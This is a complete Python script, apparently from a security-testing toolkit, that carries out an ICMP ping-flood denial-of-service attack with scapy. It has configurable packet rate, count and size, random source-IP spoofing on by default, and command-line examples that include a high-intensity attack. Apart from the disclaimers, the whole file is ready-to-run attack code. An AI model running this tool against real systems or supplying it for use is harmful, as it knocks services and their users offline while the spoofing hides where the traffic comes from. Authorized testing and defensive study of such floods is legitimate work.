#!/usr/bin/env python3
"""
ICMP Flood Attack Simulation (Ping Flood)

This module provides a class-based implementation for simulating ICMP flood attacks,
also known as Ping floods. This type of Denial of Service (DoS) attack overwhelms a
target system by sending a large volume of ICMP Echo Request (ping) packets, consuming
bandwidth and processing resources.

The module supports various features:
- Customizable packet rate and count
- Variable packet sizes
- Random source IP spoofing
- Detailed logging and statistics
- Performance monitoring

IMPORTANT ETHICAL AND LEGAL NOTICE:
This tool should ONLY be used for legitimate security testing with proper authorization.
Unauthorized use against systems without explicit permission is illegal and unethical.
The authors assume no liability for misuse of this software.

Usage Examples:
    # Basic usage with command line arguments
    python icmp_flood.py -t 192.168.1.10

    # High-intensity attack with large packets
    python icmp_flood.py -t 192.168.1.10 -c 10000 -r 1000 -s 1400

    # Specify packet rate
    python icmp_flood.py -t 192.168.1.10 -r 500

Author: Montimage
License: Proprietary
Version: 1.0.0
"""

import os
import sys
import time
import random
import argparse
import ipaddress
from typing import Dict, Any

# Add parent directory to path to import logger
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
try:
    from logger import get_logger
except ImportError:
    import logging
    def get_logger(name):
        logger = logging.getLogger(name)
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

logger = get_logger(__name__)

# Import scapy
try:
    from scapy.all import IP, ICMP, Raw, RandIP, send, conf
except ImportError:
    logger.error("This script requires the scapy library.")
    logger.error("Install it using: pip install scapy")
    sys.exit(1)

conf.verb = 0


class ICMPFloodAttack:
    """
    A class to perform ICMP flood attack simulations for security testing.

    This class generates and sends ICMP Echo Request packets to overwhelm
    a target's network resources.

    Attributes:
        target_ip (str): IP address of the target
        packet_count (int): Number of packets to send
        rate (int): Number of packets to send per second
        packet_size (int): Size of ICMP packet in bytes
        spoof_ip (bool): Whether to use random source IPs
        verbose (bool): Whether to enable verbose output
    """

    def __init__(self,
                 target_ip: str,
                 packet_count: int = 1000,
                 rate: int = 100,
                 packet_size: int = 64,
                 spoof_ip: bool = True,
                 verbose: bool = False):
        """
        Initialize the ICMP flood attack simulator.

        Args:
            target_ip (str): IP address of the target
            packet_count (int, optional): Number of packets to send. Defaults to 1000.
            rate (int, optional): Number of packets to send per second. Defaults to 100.
            packet_size (int, optional): Size of ICMP packet in bytes. Defaults to 64.
            spoof_ip (bool, optional): Whether to use random source IPs. Defaults to True.
            verbose (bool, optional): Whether to enable verbose output. Defaults to False.

        Raises:
            ValueError: If target_ip is not a valid IP address
        """
        try:
            ipaddress.ip_address(target_ip)
            self.target_ip = target_ip
        except ValueError:
            raise ValueError(f"Invalid target IP address: {target_ip}")

        self.packet_count = max(1, packet_count)
        self.rate = max(1, min(rate, 10000))
        self.packet_size = max(8, min(packet_size, 65500))  # ICMP min 8 bytes
        self.spoof_ip = spoof_ip
        self.verbose = verbose

        self.delay = 1.0 / self.rate if self.rate > 0 else 0
        self.packets_sent = 0
        self.start_time = None
        self.end_time = None

        conf.verb = 1 if verbose else 0

        logger.info(f"Initialized ICMP flood attack simulation")
        logger.info(f"Target: {target_ip}")
        if self.verbose:
            logger.info(f"Packet count: {packet_count}, Rate: {rate} packets/second")
            logger.info(f"Packet size: {packet_size} bytes")
            logger.info(f"IP spoofing: {'Enabled' if spoof_ip else 'Disabled'}")

    def create_icmp_packet(self) -> IP:
        """
        Create an ICMP Echo Request packet.

        Returns:
            IP: The constructed IP packet with ICMP Echo Request
        """
        src_ip = str(RandIP()) if self.spoof_ip else "10.0.0.1"

        # Calculate payload size (subtract IP and ICMP headers)
        payload_size = max(0, self.packet_size - 28)  # IP(20) + ICMP(8)
        payload = bytes([random.randint(0, 255) for _ in range(payload_size)])

        ip_layer = IP(dst=self.target_ip, src=src_ip)
        icmp_layer = ICMP(type=8, code=0)  # Echo Request

        packet = ip_layer/icmp_layer/Raw(load=payload)

        if self.verbose:
            logger.debug(f"Created ICMP packet: {src_ip} -> {self.target_ip} ({self.packet_size} bytes)")

        return packet

    def send_packet(self) -> bool:
        """
        Send an ICMP packet to the target.

        Returns:
            bool: True if packet sent successfully, False otherwise
        """
        try:
            packet = self.create_icmp_packet()
            send(packet, verbose=0)
            self.packets_sent += 1

            if self.verbose and self.packets_sent % 100 == 0:
                logger.debug(f"Sent {self.packets_sent} packets so far")

            return True

        except Exception as e:
            logger.error(f"Error sending ICMP packet: {str(e)}")
            return False

    def execute(self) -> Dict[str, Any]:
        """
        Execute the ICMP flood attack.

        Returns:
            Dict[str, Any]: Statistics about the attack execution
        """
        logger.info(f"Starting ICMP flood attack against {self.target_ip}")
        logger.info(f"Sending {self.packet_count} packets at {self.rate} packets/second")

        self.start_time = time.time()
        self.packets_sent = 0

        try:
            for i in range(1, self.packet_count + 1):
                self.send_packet()

                if i % (self.packet_count // 10 or 1) == 0:
                    progress = (i / self.packet_count) * 100
                    logger.info(f"Progress: {progress:.1f}% ({i}/{self.packet_count} packets)")

                if self.delay > 0:
                    time.sleep(self.delay)

            logger.info("ICMP flood attack completed successfully")

        except KeyboardInterrupt:
            logger.warning("Attack interrupted by user")
        except Exception as e:
            logger.error(f"Error during attack: {str(e)}")
        finally:
            self.end_time = time.time()
            stats = self._get_statistics()
            self._print_summary(stats)
            return stats

    def _get_statistics(self) -> Dict[str, Any]:
        """Get statistics about the attack execution."""
        end_time = self.end_time or time.time()
        start_time = self.start_time or end_time
        duration = end_time - start_time

        actual_rate = self.packets_sent / duration if duration > 0 else 0
        total_traffic = self.packets_sent * self.packet_size

        return {
            "target_ip": self.target_ip,
            "packets_sent": self.packets_sent,
            "duration_seconds": duration,
            "configured_rate": self.rate,
            "actual_rate": actual_rate,
            "rate_efficiency": (actual_rate / self.rate * 100) if self.rate > 0 else 0,
            "packet_size_bytes": self.packet_size,
            "estimated_traffic_bytes": total_traffic
        }

    def _print_summary(self, stats: Dict[str, Any]) -> None:
        """Print a summary of the attack execution."""
        logger.info("=" * 50)
        logger.info("ICMP Flood Attack Summary")
        logger.info("=" * 50)
        logger.info(f"Target: {stats['target_ip']}")
        logger.info(f"Packets sent: {stats['packets_sent']}")
        logger.info(f"Duration: {stats['duration_seconds']:.2f} seconds")
        logger.info(f"Configured rate: {stats['configured_rate']} packets/second")
        logger.info(f"Actual rate: {stats['actual_rate']:.2f} packets/second")
        logger.info(f"Rate efficiency: {stats['rate_efficiency']:.2f}%")
        logger.info(f"Packet size: {stats['packet_size_bytes']} bytes")
        logger.info(f"Estimated traffic: {stats['estimated_traffic_bytes']/1024:.2f} KB")
        logger.info("=" * 50)


def parse_arguments() -> argparse.Namespace:
    """Parse command-line arguments for the ICMP flood attack."""
    parser = argparse.ArgumentParser(
        description="ICMP Flood Attack Simulation Tool (Ping Flood)",
        epilog="IMPORTANT: Use only for authorized security testing."
    )

    parser.add_argument(
        "-t", "--target",
        dest="target_ip",
        required=True,
        help="IP address of the target"
    )

    parser.add_argument(
        "-c", "--count",
        dest="packet_count",
        type=int,
        default=1000,
        help="Number of packets to send (default: 1000)"
    )

    parser.add_argument(
        "-r", "--rate",
        dest="rate",
        type=int,
        default=100,
        help="Number of packets to send per second (default: 100)"
    )

    parser.add_argument(
        "-s", "--size",
        dest="packet_size",
        type=int,
        default=64,
        help="Size of ICMP packet in bytes (default: 64)"
    )

    parser.add_argument(
        "--spoof",
        dest="spoof_ip",
        action="store_true",
        default=True,
        help="Use random source IPs (default: True)"
    )

    parser.add_argument(
        "--no-spoof",
        dest="spoof_ip",
        action="store_false",
        help="Don't use random source IPs"
    )

    parser.add_argument(
        "-v", "--verbose",
        dest="verbose",
        action="store_true",
        help="Enable verbose output"
    )

    return parser.parse_args()


def main() -> None:
    """Main entry point for the ICMP flood attack simulation."""
    print("=" * 80)
    print("WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY")
    print("Using this tool against systems without permission is ILLEGAL")
    print("The authors assume NO LIABILITY for misuse of this software")
    print("=" * 80)
    print()

    try:
        args = parse_arguments()

        attack = ICMPFloodAttack(
            target_ip=args.target_ip,
            packet_count=args.packet_count,
            rate=args.rate,
            packet_size=args.packet_size,
            spoof_ip=args.spoof_ip,
            verbose=args.verbose
        )

        attack.execute()

    except KeyboardInterrupt:
        print("\nAttack simulation interrupted by user")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Unhandled error: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
